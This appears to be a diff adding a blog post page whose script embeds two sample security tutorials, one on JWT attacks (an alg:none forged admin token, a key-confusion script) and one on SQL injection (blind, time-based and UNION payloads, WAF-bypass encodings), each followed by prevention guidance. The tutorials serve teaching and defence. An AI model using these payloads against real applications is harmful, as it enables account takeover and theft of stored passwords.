@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Post Title - Prashant Kc</title>
+    <meta name="description" content="Technical writeups and tutorials">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="syntax.css">
+    <script src="https://unpkg.com/feather-icons"></script>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <div>
+                <h1 class="site-title">
+                    <a href="/">Prashant Kc</a>
+                </h1>
+                <div class="site-info">
+                    <h2>Developer, Security Enthusiast & Technical Writer</h2>
+                    <nav class="social-nav">
+                        <ul class="flat">
+                            <li>
+                                <a href="https://github.com/yourusername" title="Github" target="_blank">
+                                    <i data-feather="github"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://linkedin.com/in/yourusername" title="LinkedIn" target="_blank">
+                                    <i data-feather="linkedin"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://twitter.com/yourusername" title="Twitter" target="_blank">
+                                    <i data-feather="twitter"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="mailto:your.email@example.com" title="Email">
+                                    <i data-feather="mail"></i>
+                                </a>
+                            </li>
+                        </ul>
+                    </nav>
+                </div>
+                <nav>
+                    <ul class="flat">
+                        <li><a href="/">Home</a></li>
+                        <li><a href="posts.html">Writeups</a></li>
+                        <li><a href="portfolio.html">Portfolio</a></li>
+                        <li><a href="tags.html">Tags</a></li>
+                        <li><a href="about.html">About</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+
+        <!-- Post Content -->
+        <div class="content">
+            <div class="markdown">
+                <!-- This will be populated by JavaScript -->
+                <div id="postContent"></div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer>
+            <nav>
+                <ul class="flat">
+                    <li>© 2026 Prashant</li>
+                    <li><a href="about.html">About</a></li>
+                    <li><a href="mailto:your.email@example.com">Contact</a></li>
+                    <li>[Built with ❤️ and ☕]</li>
+                </ul>
+            </nav>
+        </footer>
+    </div>
+
+    <script>
+        // Sample blog posts data
+        const posts = {
+            'jwt-security': {
+                title: 'Exploiting JWT Vulnerabilities in Modern Web Apps',
+                date: '2026-01-15',
+                readTime: '5min',
+                tags: ['security', 'web', 'jwt'],
+                content: `
+                    <h1 class="single-title">Exploiting JWT Vulnerabilities in Modern Web Apps</h1>
+                    <div class="metadata">
+                        2026-01-15 | <i data-feather="clock" style="width:14px;height:14px"></i> 5min
+                        <div class="post-tags tags">
+                            <a href="tags.html?tag=security">security</a>
+                            <a href="tags.html?tag=web">web</a>
+                            <a href="tags.html?tag=jwt">jwt</a>
+                        </div>
+                    </div>
+
+                    <h2>Introduction</h2>
+                    <p>JSON Web Tokens (JWT) have become the de facto standard for API authentication in modern web applications. However, improper implementation can lead to severe security vulnerabilities. In this writeup, we'll explore common JWT vulnerabilities and how to exploit them.</p>
+
+                    <h2>Understanding JWT Structure</h2>
+                    <p>A JWT consists of three parts separated by dots:</p>
+                    <pre><code>header.payload.signature</code></pre>
+
+                    <p>Each part is base64url encoded. Let's break down an example token:</p>
+
+                    <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>
+
+                    <h3>Header</h3>
+                    <p>The header typically consists of two parts: the token type and the signing algorithm:</p>
+                    <pre><code>{
+  "alg": "HS256",
+  "typ": "JWT"
+}</code></pre>
+
+                    <h3>Payload</h3>
+                    <p>The payload contains the claims (statements about the user and additional data):</p>
+                    <pre><code>{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "iat": 1516239022,
+  "role": "user"
+}</code></pre>
+
+                    <h2>Common Vulnerabilities</h2>
+
+                    <h3>1. Algorithm Confusion (alg: none)</h3>
+                    <p>One of the most critical vulnerabilities is accepting unsigned tokens. Some JWT libraries allow the "none" algorithm, which means no signature is required.</p>
+
+                    <p><strong>Exploitation:</strong></p>
+                    <ol>
+                        <li>Decode the JWT token</li>
+                        <li>Change the algorithm to "none"</li>
+                        <li>Modify the payload as needed</li>
+                        <li>Remove the signature</li>
+                    </ol>
+
+                    <pre><code>// Original header
+{"alg": "HS256", "typ": "JWT"}
+
+// Modified header
+{"alg": "none", "typ": "JWT"}
+
+// Modified token (notice the trailing dot)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.</code></pre>
+
+                    <h3>2. Weak Secret Keys</h3>
+                    <p>When HMAC algorithms (HS256, HS384, HS512) are used with weak secrets, attackers can brute-force the secret key.</p>
+
+                    <blockquote>
+                        <p><strong>Pro tip:</strong> Use tools like <code>jwt_tool</code> or <code>hashcat</code> to crack weak JWT secrets. A wordlist attack often succeeds when developers use common passwords as secret keys.</p>
+                    </blockquote>
+
+                    <h3>3. Key Confusion Attack</h3>
+                    <p>This occurs when an application accepts both symmetric (HS256) and asymmetric (RS256) algorithms, and the public key can be used as the HMAC secret.</p>
+
+                    <pre><code>// Python example for key confusion
+import jwt
+import base64
+
+# Get the public key from the server
+public_key = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
+-----END PUBLIC KEY-----"""
+
+# Create malicious token using public key as HMAC secret
+payload = {"sub": "admin", "role": "admin"}
+token = jwt.encode(payload, public_key, algorithm="HS256")</code></pre>
+
+                    <h2>Real-World Impact</h2>
+                    <p>JWT vulnerabilities can lead to:</p>
+                    <ul>
+                        <li>Account takeover</li>
+                        <li>Privilege escalation (user → admin)</li>
+                        <li>Unauthorized access to sensitive data</li>
+                        <li>Complete application compromise</li>
+                    </ul>
+
+                    <h2>Prevention Best Practices</h2>
+
+                    <h4>1. Never Trust User Input</h4>
+                    <pre><code>// Bad - Trusting the algorithm from the token
+const decoded = jwt.verify(token, secret, {
+    algorithms: [getAlgFromToken(token)]
+});
+
+// Good - Explicitly specify allowed algorithms
+const decoded = jwt.verify(token, secret, {
+    algorithms: ['RS256']
+});</code></pre>
+
+                    <h4>2. Use Strong Secrets</h4>
+                    <ul>
+                        <li>Minimum 256 bits (32 bytes) for HS256</li>
+                        <li>Use cryptographically secure random generators</li>
+                        <li>Rotate secrets regularly</li>
+                    </ul>
+
+                    <h4>3. Implement Token Expiration</h4>
+                    <pre><code>{
+  "exp": 1516239022,  // Expiration time
+  "iat": 1516235422,  // Issued at
+  "nbf": 1516235422   // Not valid before
+}</code></pre>
+
+                    <h4>4. Validate All Claims</h4>
+                    <pre><code>// Validate issuer, audience, and expiration
+const decoded = jwt.verify(token, secret, {
+    algorithms: ['RS256'],
+    issuer: 'your-app',
+    audience: 'your-api',
+    clockTolerance: 0
+});</code></pre>
+
+                    <h2>Testing Tools</h2>
+                    <p>Essential tools for JWT security testing:</p>
+                    <ul>
+                        <li><strong>jwt_tool</strong> - Swiss army knife for JWT testing</li>
+                        <li><strong>jwt.io</strong> - Online decoder and debugger</li>
+                        <li><strong>Burp Suite</strong> - With JWT extensions</li>
+                        <li><strong>hashcat</strong> - For cracking weak secrets</li>
+                    </ul>
+
+                    <h2>Conclusion</h2>
+                    <p>JWT tokens are powerful but must be implemented correctly. Always validate the algorithm, use strong secrets, implement proper expiration, and never trust user-controlled input. Regular security audits and penetration testing can help identify vulnerabilities before they're exploited.</p>
+
+                    <hr>
+
+                    <p><em>Want to learn more about web security? Check out my other writeups on <a href="posts.html">SQL injection</a>, <a href="posts.html">XSS attacks</a>, and <a href="posts.html">API security</a>.</em></p>
+                `
+            },
+            'sql-injection': {
+                title: 'Advanced SQL Injection Techniques',
+                date: '2026-01-10',
+                readTime: '8min',
+                tags: ['security', 'sql', 'database'],
+                content: `
+                    <h1 class="single-title">Advanced SQL Injection Techniques</h1>
+                    <div class="metadata">
+                        2026-01-10 | <i data-feather="clock" style="width:14px;height:14px"></i> 8min
+                        <div class="post-tags tags">
+                            <a href="tags.html?tag=security">security</a>
+                            <a href="tags.html?tag=sql">sql</a>
+                            <a href="tags.html?tag=database">database</a>
+                        </div>
+                    </div>
+
+                    <h2>Introduction</h2>
+                    <p>SQL injection remains one of the most critical web application vulnerabilities. This writeup covers advanced techniques including blind SQL injection, time-based attacks, and WAF bypass methods.</p>
+
+                    <h2>Understanding SQL Injection</h2>
+                    <p>SQL injection occurs when user input is improperly sanitized and concatenated directly into SQL queries.</p>
+
+                    <h3>Basic Example</h3>
+                    <pre><code>// Vulnerable code
+$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
+
+// Malicious input
+user=' OR '1'='1
+
+// Resulting query
+SELECT * FROM users WHERE username = '' OR '1'='1'</code></pre>
+
+                    <h2>Blind SQL Injection</h2>
+                    <p>When the application doesn't display database errors, we need to use blind techniques to extract data.</p>
+
+                    <h3>Boolean-Based Blind SQLi</h3>
+                    <pre><code>// Check if first character of admin password is 'a'
+admin' AND SUBSTRING(password,1,1)='a'--
+
+// Binary search approach
+admin' AND ASCII(SUBSTRING(password,1,1)) > 100--</code></pre>
+
+                    <h3>Time-Based Blind SQLi</h3>
+                    <pre><code>// MySQL
+admin' AND IF(ASCII(SUBSTRING(password,1,1))>100,SLEEP(5),0)--
+
+// PostgreSQL
+admin'; SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>100) THEN pg_sleep(5) END--
+
+// MSSQL
+admin'; IF (ASCII(SUBSTRING(password,1,1))>100) WAITFOR DELAY '00:00:05'--</code></pre>
+
+                    <h2>Union-Based Injection</h2>
+                    <p>Extract data by combining results with UNION statements.</p>
+
+                    <pre><code>// Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  # Error = 2 columns
+
+// Extract data
+' UNION SELECT username,password FROM users--
+
+// Get database version
+' UNION SELECT NULL,@@version--</code></pre>
+
+                    <h2>WAF Bypass Techniques</h2>
+
+                    <h3>Case Manipulation</h3>
+                    <pre><code>SeLeCt * FrOm users</code></pre>
+
+                    <h3>Comment Injection</h3>
+                    <pre><code>SELECT/**/username/**/FROM/**/users
+SEL/*comment*/ECT * FROM users</code></pre>
+
+                    <h3>Encoding</h3>
+                    <pre><code>// URL encoding
+%53%45%4c%45%43%54
+
+// Double encoding
+%2553%2545%254c%2545%2543%2554
+
+// Hex encoding
+0x53454c454354</code></pre>
+
+                    <h2>Automated Tools</h2>
+                    <p>Essential tools for SQL injection testing:</p>
+                    <ul>
+                        <li><strong>sqlmap</strong> - Automated SQL injection tool</li>
+                        <li><strong>Burp Suite</strong> - Manual testing with Intruder</li>
+                        <li><strong>NoSQLMap</strong> - For NoSQL injection</li>
+                    </ul>
+
+                    <h2>Prevention</h2>
+                    <p>Always use prepared statements and parameterized queries:</p>
+
+                    <pre><code>// PHP PDO
+$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');
+$stmt->execute([$username]);
+
+// Node.js
+db.query('SELECT * FROM users WHERE username = $1', [username]);
+
+// Python
+cursor.execute('SELECT * FROM users WHERE username = %s', (username,))</code></pre>
+
+                    <h2>Conclusion</h2>
+                    <p>SQL injection is preventable but requires discipline. Always use parameterized queries, implement input validation, apply least privilege principles, and conduct regular security audits.</p>
+                `
+            }
+        };
+
+        // Load post content based on URL parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const postId = urlParams.get('id');
+
+        if (postId && posts[postId]) {
+            const post = posts[postId];
+            document.getElementById('postContent').innerHTML = post.content;
+            document.getElementById('pageTitle').textContent = post.title + ' - Prashant Kc';
+
+            // Re-initialize feather icons after content load
+            setTimeout(() => feather.replace(), 100);
+        } else {
+            document.getElementById('postContent').innerHTML = `
+                <h1>Post Not Found</h1>
+                <p>The requested post could not be found.</p>
+                <p><a href="posts.html">← Back to all posts</a></p>
+            `;
+        }
+
+        feather.replace();
+    </script>
+</body>
+
+</html>
